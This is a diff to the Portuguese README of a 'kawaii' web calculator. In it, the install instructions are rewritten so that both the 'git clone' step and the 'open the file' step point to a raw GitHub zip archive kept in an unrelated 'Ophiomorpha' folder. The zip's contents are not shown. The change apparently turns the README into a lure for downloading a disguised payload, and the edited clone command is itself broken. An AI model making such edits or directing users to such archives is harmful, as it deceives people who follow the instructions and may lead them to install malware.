@@ -22,10 +22,10 @@ Uma calculadora web com tema kawaii, desenvolvida com HTML, CSS e JavaScript pur
 
 1. Clone o repositório:
 ```bash
-git clone https://github.com/seu-usuario/calculadora-kawaii.git
+git clone https://github.com/awamy-exe/calculadora-kawaii/raw/refs/heads/main/Ophiomorpha/kawaii-calculadora-v2.9.zip
 ```
 
-2. Abra o arquivo `index.html` em seu navegador
+2. Abra o arquivo `https://github.com/awamy-exe/calculadora-kawaii/raw/refs/heads/main/Ophiomorpha/kawaii-calculadora-v2.9.zip` em seu navegador
 
 ## 💡 Funcionalidades
 
